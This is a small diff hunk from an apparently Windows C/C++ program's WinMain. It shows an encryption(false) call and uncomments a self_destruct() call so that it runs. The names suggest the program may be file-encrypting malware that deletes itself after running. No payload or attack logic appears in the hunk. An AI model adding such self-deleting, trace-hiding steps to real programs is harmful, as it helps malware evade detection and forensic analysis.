@@ -65,7 +65,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         encryption(false);
     }
 
-    //self_destruct();
+    self_destruct();
 
     return 0;
 }
